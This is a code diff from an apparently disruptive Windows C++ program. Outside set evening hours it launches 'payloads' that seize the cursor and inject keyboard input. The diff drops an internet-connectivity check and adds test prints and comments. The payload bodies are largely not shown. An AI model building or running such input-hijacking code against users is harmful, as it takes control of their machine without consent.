@@ -86,6 +86,7 @@ void PayloadCursor(void)
 	POINT cursor;
 	std::uniform_int_distribution<int> dist(0, 2);
 
+	// TODO: scale less horribly early
 	for (;;) {
 		GetCursorPos(&cursor);
 
@@ -97,7 +98,6 @@ void PayloadCursor(void)
 	}
 }
 
-// this function does work.
 void PayloadKeyboardInput(void)
 {
 	INPUT input;
@@ -196,25 +196,14 @@ void yesnobox(void) {
 	}
 }
 
-void nonblockingMsg(LPCWSTR displaystring, LPCWSTR title, int flags) {
-	MessageBox(nullptr, displaystring, title, flags);
-}
-
 int main(void)
 {
 	for (;;) {
+
 		time_t t = time(NULL);
 		tm tptr;
 		localtime_s(&tptr, &t);
-		if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
-			std::thread(nonblockingMsg, L"Please reconnect to the network", L"Warning", MB_OK | MB_APPLMODAL).detach();
-
-			std::this_thread::sleep_for(std::chrono::seconds(15));
-			if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
-				goto startofend;
-			}
-		}
-		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) {
+		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) { // NOTE: this breaks if the user is able to change time
 #ifdef TEST
 			std::cout << "Game time" << std::endl;
 #ifdef FORCELOOP
@@ -226,8 +215,9 @@ int main(void)
 #endif
 			continue;
 		}
-
-	startofend:
+#ifdef TEST
+		std::cout << "Not game time" << std::endl;
+#endif
 
 		std::thread(yesnobox).detach();
 		std::thread(LaunchPayloads).detach();
